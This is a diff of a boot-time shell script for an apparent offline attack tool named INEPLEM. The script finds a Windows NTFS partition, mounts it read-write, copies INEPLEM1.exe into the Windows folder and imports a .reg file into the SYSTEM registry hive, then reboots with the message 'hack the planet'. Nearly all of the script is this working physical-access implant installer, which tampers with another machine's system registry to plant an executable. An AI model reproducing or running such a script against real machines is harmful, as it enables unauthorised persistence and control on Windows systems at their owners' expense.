@@ -1,39 +1,50 @@
-#!/bin/busybox sh
-export PATH=/bin
+#!/bin/sh
 
-busybox mount -t proc proc /proc
-busybox mount -t sysfs sysfs /sys
-busybox mount -t devtmpfs devtmpfs /dev
-
-busybox clear
+clear
 echo "################################################################################"
 echo "#                                   INEPLEM                                    #"
 echo "################################################################################"
+
+while true; do
+	printf "# Install INEPLEM ? [y/n] "
+	read -r -s -n 1 response
+	printf "%c" "$response"
+	echo "                                                    #"
+	[ "$response" = "y" ] && break
+	if [ "$response" = "n" ]; then
+		echo "# OK fine ! Go to tty2 for a shell ! You can press ^C to relaunch INEPLEM.init #"
+		echo "################################################################################"
+		# Sleep "forever"
+		sleep 365d
+	fi
+done
+
+echo "################################################################################"
 echo "# Searching Windows NTFS Drive....                                             #"
-for f in $(busybox fdisk -l | busybox grep -E "(NTFS|EFI GPT)" | busybox cut -d " " -f 1)
+for f in $(fdisk -l | grep -E "(NTFS|EFI GPT)" | cut -d " " -f 1)
 do
-	printf "# Trying $f...    "
-	ntfs-3g -o ro $f /mnt
+	printf "# Trying %s...    " "$f"
+	ntfs-3g -o ro "$f" /mnt
 	if [ ! -d "/mnt/Windows/System32" ]; then
 		echo "NO                                                    #"
-		busybox umount /mnt
+		umount /mnt
 		continue
 	fi
 	echo "YES                                                   #"
 	echo "################################################################################"
-	busybox umount /mnt
-	ntfs-3g -o rw $f /mnt
+	umount /mnt
+	ntfs-3g -o rw "$f" /mnt
 	echo "# Drive mounted in RW                                                          #"
-	busybox cp /share/INEPLEM1.exe /mnt/Windows/INEPLEM1.exe
+	cp /ineplem/INEPLEM1.exe /mnt/Windows/INEPLEM1.exe
 	echo "# INEPLEM1.exe copied                                                          #"
-	reged -C -I /mnt/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE\\SYSTEM /share/INEPLEM1.reg > /dev/null
+	reged -C -I /mnt/Windows/System32/config/SYSTEM HKEY_LOCAL_MACHINE\\SYSTEM /ineplem/INEPLEM1.reg > /dev/null
 	echo "# INEPLEM1.reg applied                                                         #"
 	echo "# sha1 from copied file and reg :                                              #"
-	busybox sha1sum /share/INEPLEM1.reg /mnt/Windows/INEPLEM1.exe
-	echo "# cat of /share/INEPLEM.sha                                                    #"
-	busybox cat /share/INEPLEM.sha
-	busybox umount /mnt
-	#busybox sync
+	sha1sum /ineplem/INEPLEM1.*
+	echo "# cat of /ineplem/INEPLEM.sha                                                  #"
+	cat /ineplem/INEPLEM.sha
+	umount /mnt
+	sync
 	echo "# File system unmounted                                                        #"
 	echo "################################################################################"
 	break
@@ -41,17 +52,8 @@ done
 echo "# INEPLEM have been installed !                                                #"
 echo "# Press ENTER to reboot and hack the planet !                                  #"
 echo "################################################################################"
-read i
-busybox clear
-printf "OK"
+read -r
+clear
 
-echo e > /proc/sysrq-trigger
-printf "."
-busybox sleep 0.1s
-echo i > /proc/sysrq-trigger
-printf "."
-echo s > /proc/sysrq-trigger
-printf "."
-echo u > /proc/sysrq-trigger
-printf "."
-echo b > /proc/sysrq-trigger
+printf "OK"
+reboot
